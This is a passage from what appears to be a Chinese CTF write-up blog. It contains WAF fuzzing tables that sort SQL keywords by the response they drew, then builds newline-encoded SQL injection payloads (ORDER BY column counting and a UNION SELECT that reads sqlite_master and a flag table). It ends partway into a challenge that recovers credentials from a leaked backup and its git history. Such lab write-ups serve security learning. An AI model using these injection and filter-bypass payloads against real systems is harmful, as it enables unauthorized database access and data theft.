class="line">COLUMN</span><br><span class="line">COlumn</span><br><span class="line">COUNT</span><br><span class="line">Count</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#x27;1&#x27;=&#x27;1</span><br><span class="line">when</span><br><span class="line">admin&#x27;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">REVERSE</span><br><span class="line">ascii</span><br><span class="line">ASSIC</span><br><span class="line">ASSic</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">union</span><br><span class="line">UNIon</span><br><span class="line">UNION</span><br><span class="line">&quot;</span><br><span class="line">&#x27;</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">*/*</span><br><span class="line">/**/</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UNION</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">join</span><br><span class="line">rand()</span><br><span class="line">substr(</span><br><span class="line">substring(</span><br><span class="line">mid(</span><br><span class="line">rand(</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">char(</span><br><span class="line">hex(</span><br><span class="line">ascii(</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order</span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">/*</span><br><span class="line">`</span><br><span class="line"> </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a</span><br><span class="line">%0A</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">=</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line">%27</span><br><span class="line">%23</span><br><span class="line">%22</span><br><span class="line">%20</span><br><span class="line">%0a</span><br></pre></td></tr></table></figure><p>200的有:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NULL    </span><br><span class="line">TURE</span><br></pre></td></tr></table></figure><br/><p>500的有:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">1    length    </span><br><span class="line">2    Length     </span><br><span class="line">3    +    </span><br><span class="line">4    handler        </span><br><span class="line">5    like    </span><br><span class="line">6    LiKe       </span><br><span class="line">7    select        </span><br><span class="line">8    SeleCT       </span><br><span class="line">9    sleep    </span><br><span class="line">10    SLEEp   </span><br><span class="line">11    database    </span><br><span class="line">12    DATABASe       </span><br><span class="line">13    delete     </span><br><span class="line">14    having        </span><br><span class="line">15    or    </span><br><span class="line">16    oR     </span><br><span class="line">17    as    </span><br><span class="line">18    As    </span><br><span class="line">19    -~   </span><br><span class="line">20    BENCHMARK      </span><br><span class="line">21    limit      </span><br><span class="line">22    LimIt   </span><br><span class="line">23    left      </span><br><span class="line">24    Left       </span><br><span class="line">25    select   </span><br><span class="line">26    SELECT   </span><br><span class="line">27    insert   </span><br><span class="line">28    insERT   </span><br><span class="line">29    INSERT    </span><br><span class="line">30    right     </span><br><span class="line">33    INFORMATION    </span><br><span class="line">36    !       </span><br><span class="line">37    %        </span><br><span class="line">38    +       </span><br><span class="line">39    xor       </span><br><span class="line">40    &lt;&gt;   </span><br><span class="line">41    (       </span><br><span class="line">42    &gt;   </span><br><span class="line">43    &lt;   </span><br><span class="line">44    )    </span><br><span class="line">45    .     </span><br><span class="line">46    ^        </span><br><span class="line">48    AND        </span><br><span class="line">49    ANd    </span><br><span class="line">50    BY   </span><br><span class="line">51    By    </span><br><span class="line">52    CAST      </span><br><span class="line">53    COLUMN  </span><br><span class="line">54    COlumn        </span><br><span class="line">55    COUNT       </span><br><span class="line">56    Count      </span><br><span class="line">57    CREATE      </span><br><span class="line">58    END     </span><br><span class="line">59    case     </span><br><span class="line">61    when    </span><br><span class="line">65    +    </span><br><span class="line">66    REVERSE   </span><br><span class="line">67    ascii       </span><br><span class="line">68    ASSIC    </span><br><span class="line">69    ASSic    </span><br><span class="line">71    database   </span><br><span class="line">72    left     </span><br><span class="line">73    right    </span><br><span class="line">74    union    </span><br><span class="line">75    UNIon    </span><br><span class="line">76    UNION     </span><br><span class="line">79    &amp;     </span><br><span class="line">80    &amp;&amp;      </span><br><span class="line">81    ||     </span><br><span class="line">82    oorr     </span><br><span class="line">88    anandd      </span><br><span class="line">89    GROUP   </span><br><span class="line">90    HAVING      </span><br><span class="line">91    IF       </span><br><span class="line">92    INTO      </span><br><span class="line">93    JOIN        </span><br><span class="line">94    LEAVE      </span><br><span class="line">95    LEFT    </span><br><span class="line">96    LEVEL       </span><br><span class="line">97    sleep    </span><br><span class="line">98    LIKE     </span><br><span class="line">99    NAMES      </span><br><span class="line">100    NEXT     </span><br><span class="line">102    OF        </span><br><span class="line">103    ON       </span><br><span class="line">104    |   </span><br><span class="line">105    infromation_schema      </span><br><span class="line">106    user     </span><br><span class="line">107    OR     </span><br><span class="line">108    ORDER       </span><br><span class="line">109    ORD   </span><br><span class="line">110    SCHEMA        </span><br><span class="line">111    SELECT       </span><br><span class="line">112    SET      </span><br><span class="line">113    TABLE      </span><br><span class="line">114    THEN     </span><br><span class="line">115    UNION        </span><br><span class="line">116    UPDATE       </span><br><span class="line">117    USER      </span><br><span class="line">118    USING      </span><br><span class="line">119    VALUE       </span><br><span class="line">120    VALUES       </span><br><span class="line">121    WHEN      </span><br><span class="line">122    WHERE       </span><br><span class="line">123    ADD       </span><br><span class="line">124    AND       </span><br><span class="line">125    prepare        </span><br><span class="line">126    set      </span><br><span class="line">127    update     </span><br><span class="line">128    delete        </span><br><span class="line">129    drop        </span><br><span class="line">130    inset        </span><br><span class="line">131    CAST        </span><br><span class="line">132    COLUMN      </span><br><span class="line">133    CONCAT      </span><br><span class="line">134    GROUP_CONCAT       </span><br><span class="line">135    group_concat       </span><br><span class="line">136    CREATE        </span><br><span class="line">137    DATABASE      </span><br><span class="line">138    DATABASES    </span><br><span class="line">139    alter     </span><br><span class="line">140    DELETE        </span><br><span class="line">141    DROP     </span><br><span class="line">142    floor      </span><br><span class="line">143    join     </span><br><span class="line">144    rand()        </span><br><span class="line">148    rand(       </span><br><span class="line">149    information_schema.tables        </span><br><span class="line">150    TABLE_SCHEMA    </span><br><span class="line">151    %df    </span><br><span class="line">152    concat_ws()    </span><br><span class="line">153    concat   </span><br><span class="line">157    LIMIT       </span><br><span class="line">158    ORD    </span><br><span class="line">159    ON     </span><br><span class="line">160    extractvalue        </span><br><span class="line">161    order        </span><br><span class="line">162    CAST()      </span><br><span class="line">163    by       </span><br><span class="line">164    ORDER        </span><br><span class="line">165    OUTFILE        </span><br><span class="line">166    RENAME       </span><br><span class="line">167    REPLACE        </span><br><span class="line">168    SCHEMA       </span><br><span class="line">169    SELECT       </span><br><span class="line">170    SET    </span><br><span class="line">171    updatexml      </span><br><span class="line">172    SHOW       </span><br><span class="line">173    SQL   </span><br><span class="line">174    TABLE   </span><br><span class="line">175    THEN  </span><br><span class="line">177    instr    </span><br><span class="line">178    benchmark   </span><br><span class="line">179    format        </span><br><span class="line">180    bin    </span><br><span class="line">181    substring       </span><br><span class="line">182    ord        </span><br><span class="line">183    UPDATE       </span><br><span class="line">184    VALUES    </span><br><span class="line">185    VARCHAR       </span><br><span class="line">186    VERSION       </span><br><span class="line">187    WHEN        </span><br><span class="line">188    WHERE        </span><br><span class="line">190    `       </span><br><span class="line">193    users      </span><br><span class="line">194    %0a      </span><br><span class="line">195    %0A        </span><br><span class="line">196    %0b        </span><br><span class="line">197    mid        </span><br><span class="line">198    for        </span><br><span class="line">199    BEFORE        </span><br><span class="line">200    REGEXP        </span><br><span class="line">201    RLIKE      </span><br><span class="line">202    in       </span><br><span class="line">204    SEPARATOR        </span><br><span class="line">205    XOR        </span><br><span class="line">206    CURSOR        </span><br><span class="line">207    FLOOR        </span><br><span class="line">208    sys.schema_table_statistics_with_buffer        </span><br><span class="line">209    INFILE        </span><br><span class="line">210    count        </span><br><span class="line">211    %0c        </span><br><span class="line">212    from        </span><br><span class="line">213    %0d      </span><br><span class="line">214    %a0        </span><br><span class="line">216    @        </span><br><span class="line">217    else  </span><br></pre></td></tr></table></figure><br/><p>403的是:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">31    #       </span><br><span class="line">32    --+      </span><br><span class="line">34    --       </span><br><span class="line">35    ;       </span><br><span class="line">47    =       </span><br><span class="line">60    &#x27;1&#x27;=&#x27;1        </span><br><span class="line">62    admin&#x27;       </span><br><span class="line">63    &quot;       </span><br><span class="line">64    length        </span><br><span class="line">70    select         </span><br><span class="line">77    &quot;        </span><br><span class="line">78    &#x27;      </span><br><span class="line">83    /        </span><br><span class="line">84    //        </span><br><span class="line">85    //*        </span><br><span class="line">86    */*        </span><br><span class="line">87    /**/        </span><br><span class="line">145    substr(        </span><br><span class="line">146    substring(        </span><br><span class="line">147    mid(        </span><br><span class="line">154    char(        </span><br><span class="line">155    hex(        </span><br><span class="line">156    ascii(        </span><br><span class="line">189    /*       </span><br><span class="line">191             </span><br><span class="line">192    ,    </span><br><span class="line">203    sys schemma        </span><br><span class="line">215    =        </span><br><span class="line">218    %27    </span><br><span class="line">219    %23        </span><br><span class="line">220    %22       </span><br><span class="line">221    %20    </span><br></pre></td></tr></table></figure><p>使用以下的表構造payload:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1%0AORdeR%0ABy%0A1</span><br><span class="line">1%0AORdeR%0ABy%0A10</span><br><span class="line">1</span><br><span class="line">ORdeR</span><br><span class="line">By</span><br><span class="line">10</span><br></pre></td></tr></table></figure><img src="5c86363ff2ee4e023fd44027e77e160b.png" alt="5c86363ff2ee4e023fd44027e77e160b.png"  /><p>可以看見有5列 , 用id&#x3D;-1%0aORDER%0aBY%0a5 測試了一下是可以的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=-1</span><br><span class="line">ORDER</span><br><span class="line">BY</span><br><span class="line">5</span><br></pre></td></tr></table></figure><img src="3473398aa359f766e196f8de9b33181c.png" alt="3473398aa359f766e196f8de9b33181c.png"  /><p>要構造 UNION SELECT 語句</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br><span class="line">UNION</span><br><span class="line">SELECT</span><br><span class="line">*</span><br><span class="line">from</span><br><span class="line">(SELECT</span><br><span class="line">NULL)a</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)b</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)c</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)d</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)e</span><br></pre></td></tr></table></figure><p>URL編碼一下: -1%0aUNION%0aSELECT%0a*%0afrom%0a(SELECT%0aNULL)a%0aJOIN%0a(SELECT%0agroup_concat(name)%0afrom%0asqlite_master%0aWHERE%0atype%0aLIKE%0a0x7461626c65)b%0aJOIN%0a(SELECT%0aNULL)c%0aJOIN%0a(SELECT%0aNULL)d%0aJOIN%0a(SELECT%0aNULL)e</p><p>試一試:</p><p>-1 UNION SELECT * from (SELECT NULL)a </p><p>JOIN (SELECT group_concat(name) from sqlite_master)b </p><p>JOIN(SELECT NULL)c</p><p>JOIN(SELECT NULL)d</p><p>JOIN(SETECT NULL)e</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br><span class="line">UNION</span><br><span class="line">SELECT</span><br><span class="line">*</span><br><span class="line">from</span><br><span class="line">(SELECT</span><br><span class="line">NULL)a</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">group_concat(name)</span><br><span class="line">from</span><br><span class="line">sqlite_master)b</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)c</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)d</span><br><span class="line">JOIN</span><br><span class="line">(SELECT</span><br><span class="line">NULL)e</span><br></pre></td></tr></table></figure><p>-1%0aUNION%0aSELECT%0a*%0afrom%0a(SELECT%0aNULL)a%0aJOIN%0a(SELECT%0agroup_concat(name)%0afrom%0asqlite_master)b%0aJOIN%0a(SELECT%0aNULL)c%0aJOIN%0a(SELECT%0aNULL)d%0aJOIN%0a(SELECT%0aNULL)e</p><br/><p>“node_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequence”</p><br/><p>-1 UNION SELECT * from (SELECT  group_concat(name) from sqlite_master)a </p><p>JOIN (SELECT NULL)b </p><p>JOIN(SELECT NULL)c</p><p>JOIN(SELECT NULL)d</p><p>JOIN(SETECT NULL)e</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1  select * from(SELECT *, floor(1+rand(5)*500000) as a FROM `flag`)t WHERE a = 1</span><br></pre></td></tr></table></figure><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="1-小E的秘密计划"><a href="#1-小E的秘密计划" class="headerlink" title="1.小E的秘密计划"></a>1.小E的秘密计划</h2><p><a href="http://www.zip/">www.zip</a> 為備份文件 , url&#x2F;ww.zip下載 , </p><img src="361fd33e57cceeae07f915f9e74450d6.png" alt="361fd33e57cceeae07f915f9e74450d6.png"  /><p>看以看見index.html是<a href="https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/">https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/</a></p><p>進入public-555edc76-9621-4997-86b9-01483a50293e , 有一個login.php , </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">getUserData</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="variable">$userData</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$password</span> === <span class="variable">$userData</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /secret-xxxxxxxxxxxxxxxxxxx&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录失败,在git里找找吧&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用git bash進行控制</p><p>git bash</p><p>使用git进行版本控制</p><p>查看提交历史：</p><p>git log –oneline</p><img src="cedc26f5a288a6a307272f8d41f67e79.png" alt="cedc26f5a288a6a307272f8d41f67e79.png"  /><p>$ git diff –name-status 1389b47 5f8ecc0<br>A tips.txt</p><br/><p>$ git checkout 353b98f7c2fe77a5a426bf73576f5113820c4669</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Note: switching to &#x27;353b98f7c2fe77a5a426bf73576f5113820c4669&#x27;.</span><br><span class="line">You are in &#x27;detached HEAD&#x27; state. You can look around, make experimental</span><br><span class="line">changes and commit them, and you can discard any commits you make in this</span><br><span class="line">state without impacting any branches by switching back to a branch.</span><br><span class="line">If you want to create a new branch to retain commits you create, you may</span><br><span class="line">do so (now or later) by using -c with the switch command. Example:</span><br><span class="line">git switch -c &lt;new-branch-name&gt;</span><br><span class="line">Or undo this operation with:</span><br><span class="line">git switch -</span><br><span class="line">Turn off this advice by setting config variable advice.detachedHead to false</span><br><span class="line">HEAD is now at 353b98f 测试，这个branch会删</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$ git diff 1389b4798a8013a1c90fb2d867243d0da18c5175…353b98f7c2fe77a5a426bf73576f5113820c4669 –name-status</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A user.php</span><br></pre></td></tr></table></figure><br/><p>$ cat user.php</p><img src="e225b0ab18591072357866366f4cfc31.png" alt="e225b0ab18591072357866366f4cfc31.png"  /><br/><p>$ git switch master</p><br/><p>換回master mode </p><br/><p>$ cat index.html</p><br/><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Project X - 登录系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../css/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;floating-shapes&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;floating-shape shape-circle&quot;</span> <span class="attr">style</span>=<span class="string">&quot;top: 15%; left: 10%;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span 